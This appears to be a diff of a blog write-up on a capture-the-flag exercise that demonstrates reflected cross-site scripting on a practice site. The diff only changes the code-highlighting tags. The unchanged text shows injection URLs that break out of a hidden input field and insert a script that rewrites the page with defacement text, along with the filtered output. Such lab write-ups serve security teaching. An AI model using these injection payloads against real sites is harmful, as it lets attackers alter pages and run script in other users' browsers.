@@ -17,7 +17,7 @@ For almost all levels I will be using Burpsuite. Burpsuite is an interception pr
  
 First let's inspect the source for anything interesting.
 
-{% highlight html linenos %}
+{% highlight html  %}
 <form class="ex7-form" action="">
 	<label for="name">    <span class="glyphicon glyphicon-user"></span>Username:</label>
 	<input type="text" id="name" name="name" class="form-control input-lg"/>
@@ -37,7 +37,7 @@ with users, the XSS will be Reflective. Reflective XSS is done via the URL, let'
 If we insert '/TEST' at the end of the URL and inspect the source again, we will see that our string is being appended to the
 hidden input field.
 
-{% highlight html linenos %}
+{% highlight html  %}
 <form class="ex7-form" action="">
 	<label for="name">    <span class="glyphicon glyphicon-user"></span>Username:</label>
 	<input type="text" id="name" name="name" class="form-control input-lg"/>
@@ -61,7 +61,7 @@ http://ctf.infosecinstitute.com/ctf2/exercises/ex7.php/'><h1>Blah</h1>
 
 The source now looks like this:
 
-{% highlight html linenos %}
+{% highlight html  %}
 <form class="ex7-form" action="">
     <label for="name">    <span class="glyphicon glyphicon-user"></span>Username:</label>
     <input type="text" id="name" name="name" class="form-control input-lg"/>
@@ -84,13 +84,13 @@ I tried injecting some JavaScript so I can replace the "YOUR NAME HERE" text but
 
 Injection URL:
 
-{% highlight text linenos %}
+{% highlight text  %}
 http://ctf.infosecinstitute.com/ctf2/exercises/ex7.php/'><script>document.getElementsByClassName("label")[0].innerHTML = "<h1>The bishokukai were here!</h1>";</script>
 {% endhighlight %}
 
 And if we see the source, we will notice the &lt;script&gt; is stripped.
 
-{% highlight html linenos %}
+{% highlight html  %}
 <input name="action" type="hidden" value='/ctf2/exercises/ex7.php/'>document.getElementsByClassName("label")[0].innerHTML = "<h1>The bishokukai were here!</h1>";               '>
 <div>
 {% endhighlight %}
